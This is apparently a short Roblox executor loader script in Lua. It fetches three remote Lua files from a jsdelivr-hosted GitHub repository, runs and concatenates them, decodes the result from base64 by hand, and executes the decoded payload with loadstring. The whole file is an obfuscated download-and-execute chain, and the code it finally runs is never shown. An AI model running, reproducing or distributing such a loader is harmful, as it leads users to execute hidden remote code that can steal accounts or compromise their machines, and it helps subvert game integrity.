getgenv().__Pd80HaB64HhM3I = "f6eff591597422d8d78914412b785ac3"
local u={"https://cdn.jsdelivr.net/gh/alexzerikov-sudo/magicalay-dist@main/c7FE1KEi1W.lua","https://cdn.jsdelivr.net/gh/alexzerikov-sudo/magicalay-dist@main/9QzDfddtIc.lua","https://cdn.jsdelivr.net/gh/alexzerikov-sudo/magicalay-dist@main/0tgH78rOAE.lua"}
local s=""
for i=1,#u do s=s..loadstring(game:HttpGet(u[i]))() end
local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local t={}
for i=1,#s,4 do
local n=0
for j=0,3 do local c=s:sub(i+j,i+j)n=n*64+((c=="=")and 0 or(b:find(c,1,true)-1))end
t[#t+1]=string.char(math.floor(n/65536))t[#t+1]=string.char(math.floor(n/256)%256)t[#t+1]=string.char(n%256)end
loadstring(table.concat(t))()
